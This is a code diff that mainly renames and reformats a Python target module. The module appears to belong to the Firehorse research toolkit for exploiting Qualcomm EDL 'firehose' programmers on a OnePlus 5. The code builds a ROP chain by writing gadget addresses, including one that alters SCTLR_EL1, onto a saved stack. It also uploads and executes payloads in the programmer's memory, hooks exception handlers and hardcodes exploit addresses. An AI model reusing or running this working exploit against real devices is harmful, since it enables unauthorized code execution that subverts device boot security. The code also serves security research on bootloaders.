@@ -16,7 +16,7 @@ import target
 import constants
 from log import *
 from cmd import *
-from fw import Framework as p
+from fw import Framework as FH_FW
 from fw import *
 from fh import *
 import target as t
@@ -83,121 +83,120 @@ def rop():
     target = t.get()
 
     # super gadget
-    
-#    p.poke64(target.saved_lr_addr+8, GADGET_INFINITE_LOOP)
+#    FH_FW.poke64(target.saved_lr_addr+8, GADGET_INFINITE_LOOP)
 
     """
     # copy original stack
-    p.copy(target.saved_lr_addr+0x128, target.saved_lr_addr+8, 0x128)
-    
+    FH_FW.copy(target.saved_lr_addr+0x128, target.saved_lr_addr+8, 0x128)
+
     # copy original saved lr
-    p.poke64(target.saved_lr_addr+0x120, target.saved_lr)
-    
+    FH_FW.poke64(target.saved_lr_addr+0x120, target.saved_lr)
+
     # set new stack
-    p.poke64(target.saved_lr_addr+0x20, target.saved_lr_addr+0x118)
+    FH_FW.poke64(target.saved_lr_addr+0x20, target.saved_lr_addr+0x118)
 
     # set blr x8 gadget
-    p.poke64(target.saved_lr_addr+0x8, GADGET_RESET)
-    
-    # set saved_x8 
-    p.poke64(target.saved_lr_addr+0xb8, GADGET_RESET)
+    FH_FW.poke64(target.saved_lr_addr+0x8, GADGET_RESET)
 
-
+    # set saved_x8
+    FH_FW.poke64(target.saved_lr_addr+0xb8, GADGET_RESET)
     # set super gadget
-    p.poke64(target.saved_lr_addr, GADGET_SUPER)
+    FH_FW.poke64(target.saved_lr_addr, GADGET_SUPER)
     """
-    # p.poke64(target.saved_lr_addr+0xC0, 0)
-    # p.poke64(target.saved_lr_addr+0x30, GADGET_RESET)
-    # p.poke64(target.saved_lr_addr+0x28, GADGET_RESET)
-    # p.poke64(target.saved_lr_addr+0x20, GADGET_RESET)
-    # p.poke64(target.saved_lr_addr+0x18, GADGET_RESET)
-    # p.poke64(target.saved_lr_addr+0x10, GADGET_RESET)
-    #p.poke64(target.saved_lr_addr+0x8, GADGET_RESET)
+    # FH_FW.poke64(target.saved_lr_addr+0xC0, 0)
+    # FH_FW.poke64(target.saved_lr_addr+0x30, GADGET_RESET)
+    # FH_FW.poke64(target.saved_lr_addr+0x28, GADGET_RESET)
+    # FH_FW.poke64(target.saved_lr_addr+0x20, GADGET_RESET)
+    # FH_FW.poke64(target.saved_lr_addr+0x18, GADGET_RESET)
+    # FH_FW.poke64(target.saved_lr_addr+0x10, GADGET_RESET)
+    # FH_FW.poke64(target.saved_lr_addr+0x8, GADGET_RESET)
 
-    p.poke64(target.saved_lr_addr+0x1f0, 0x0) # x1
-    p.poke64(target.saved_lr_addr+0x108, 0x98) # x28
-    p.poke64(target.saved_lr_addr+0x128, 0x1) # x24
-    p.poke64(target.saved_lr_addr+0x130, 0x1000) # X25
-    p.poke64(target.saved_lr_addr+0x160, target.saved_lr_addr+0x218+0x28)
-    p.poke64(target.saved_lr_addr+0x200, target.saved_lr_addr+0x218+0x28)
+    FH_FW.poke64(target.saved_lr_addr+0x1f0, 0x0) # x1
+    FH_FW.poke64(target.saved_lr_addr+0x108, 0x98) # x28
+    FH_FW.poke64(target.saved_lr_addr+0x128, 0x1) # x24
+    FH_FW.poke64(target.saved_lr_addr+0x130, 0x1000) # X25
+    FH_FW.poke64(target.saved_lr_addr+0x160, target.saved_lr_addr+0x218+0x28)
+    FH_FW.poke64(target.saved_lr_addr+0x200, target.saved_lr_addr+0x218+0x28)
 
-    p.copy_and_rebase(target.saved_lr_addr+0x218, target.saved_lr_addr+8, 0x210)
-    p.poke64(target.saved_lr_addr+0x210, target.saved_lr)
-    p.poke64(target.saved_lr_addr+0x110, target.saved_lr_addr+0x208)
-    p.poke64(target.saved_lr_addr+0x1a8, GADGET_SCTLR_EL1)
-    p.poke64(target.saved_lr_addr+0xf8, GADGET_BLR_X8)
-    p.poke64(target.saved_lr_addr+0xf0, GADGET_SUPER)
-    p.poke64(target.saved_lr_addr, GADGET_ADD_SP)
+    FH_FW.copy_and_rebase(target.saved_lr_addr+0x218, target.saved_lr_addr+8, 0x210)
+    FH_FW.poke64(target.saved_lr_addr+0x210, target.saved_lr)
+    FH_FW.poke64(target.saved_lr_addr+0x110, target.saved_lr_addr+0x208)
+    FH_FW.poke64(target.saved_lr_addr+0x1a8, GADGET_SCTLR_EL1)
+    FH_FW.poke64(target.saved_lr_addr+0xf8, GADGET_BLR_X8)
+    FH_FW.poke64(target.saved_lr_addr+0xf0, GADGET_SUPER)
+    FH_FW.poke64(target.saved_lr_addr, GADGET_ADD_SP)
 
 
 def voodoo():
     target = t.get()
     for i in xrange(4):
         print '%d' % i
-        p.peek(target.fh_base_programmer, 0x1100)
+        FH_FW.peek(target.fh_base_programmer, 0x1100)
+
 
 def upload_init64():
     target = t.get()
-    p.poke64(target.fh_base_programmer, 0x12345678)
-    p.sendfile("../device/build/init64.payload", target.fh_base_programmer)
-    p.exe64(target.fh_base_programmer)
+    FH_FW.poke64(target.fh_base_programmer, 0x12345678)
+    FH_FW.sendfile("../device/build/init64.payload", target.fh_base_programmer)
+    FH_FW.exe64(target.fh_base_programmer)
+
 
 def upload_fh():
-    
-    target = t.get()  
-    e = XMLHunter(file("../device/build/fh64.payload","rb").read(), target.fh_base_programmer, target)
+    target = t.get()
+    e = XMLHunter(file("../device/build/fh64.payload", "rb").read(),
+                  target.fh_base_programmer, target)
     e.send()
     return
-    
-def upload_fh_data():
 
-    target = t.get()  
-  
-    bbdb = BasicBlocks(target.basicblocks_db_pbl)    
+
+def upload_fh_data():
+    target = t.get()
+
+    bbdb = BasicBlocks(target.basicblocks_db_pbl)
     bpm = BreakpointManager(bbdb)
     bpm.bp_programmer(0x1402C958, msg="peek0")
     bpm.bp_programmer(0x1402C964, msg="peek1")
-    
+
     pm = PatchManager()
-    #pm.patch32_programmer(0x1402C958, 0xFFFFFFFF)
+    # I('applying patches and breakpoints...')
+    # pm.patch32_programmer(0x1402C958, 0xFFFFFFFF)
 
-    I('applying patches and breakpoints...')
 
-    
     I('creating pagecopy...')
     pages = set()
 
     I('pages: ' + str(pages))
-
-    #pc = PageCopy(MODE_PBL, target.pbl_base_addr, target.pbl_copy_addr, pages, target_pages = [0x21b000, 0x21c000, 0x21d000, 0x21e000, 0x8068000, 0x806e000, 0x219000])
-    pc = PageCopy(MODE_PBL, target.pbl_base_addr, target.pbl_copy_addr, pages, target_pages = [0x807D000, 0x807E000, 0x807F000, 0x807C000, 0x8068000, 0x806e000, 0x807B000])
+    pc = PageCopy(MODE_PBL, target.pbl_base_addr, target.pbl_copy_addr, pages,
+                  target_pages=[0x807D000, 0x807E000, 0x807F000, 0x807C000,
+                                0x8068000, 0x806e000, 0x807B000])
 
     I('uploading firehorse data...')
     fh = Firehorse(pm, bpm, pc)
     fhdata = fh.pack()
-    fhbin = file("../tmp/fh.bin","wb")
+    fhbin = file("../tmp/fh.bin", "wb")
     fhbin.write(fhdata)
     fhbin.close()
 
     e = XMLHunter(fhdata, target.fh_base_programmer+target.fh_scratch_offset, target)
     e.send()
 
+
 def init_firehose():
     target = t.get()
     cmd = Commands()
 
     I('initializing firehorse...')
-    p.exe64_cmd(target.fh_base_programmer, cmd.INIT)
-    
+    FH_FW.exe64_cmd(target.fh_base_programmer, cmd.INIT)
+
 
 def hook_handlers():
     target = t.get()
-  
+
     I("Hooking handlers")
     for i in xrange(16):
         I("%d" % i)
-        p.sendfile("../device/build/dbgentry64.payload", 0x14015000+i*0x80)
-    
+        FH_FW.sendfile("../device/build/dbgentry64.payload", 0x14015000+i*0x80)
+
 
 def magic():
     rop()
@@ -208,18 +207,22 @@ def magic():
     hook_handlers()
 
 
-t.add_target(name="cheeseburger", arch=64, 
-                programmer_path=r"target/oneplus5/programmer.bin", 
-                peekpoke_style=1, 
-                saved_lr=0x1402be48, saved_lr_addr = 0x1406ae78,
-                exe_addr = 0x1406ae78+0x210,
-                page_table_base = 0x1400f000, tnsz=28,
-                fh_base_programmer = 0x14690000,
-                fh_base_aboot=0x8f900000, fh_scratch_offset=0x20000, fh_saved_regs_offset=0, 
-                egghunter_base = 0x1407c000,
-                uart = 0x14074040,
-                ttbr0_el1 = 0x1400f000,
-                pt_levels = 3,
-                rop=rop,
-                magic=magic,
-                xmlhunter_part_size = 80)
+t.add_target(name="cheeseburger", arch=64,
+             programmer_path=r"target/oneplus5/programmer.bin",
+             peekpoke_style=1,
+             saved_lr=0x1402be48,
+             saved_lr_addr=0x1406ae78,
+             exe_addr=0x1406ae78+0x210,
+             page_table_base=0x1400f000,
+             tnsz=28,
+             fh_base_programmer=0x14690000,
+             fh_base_aboot=0x8f900000,
+             fh_scratch_offset=0x20000,
+             fh_saved_regs_offset=0,
+             egghunter_base=0x1407c000,
+             uart=0x14074040,
+             ttbr0_el1=0x1400f000,
+             pt_levels=3,
+             rop=rop,
+             magic=magic,
+             xmlhunter_part_size=80)
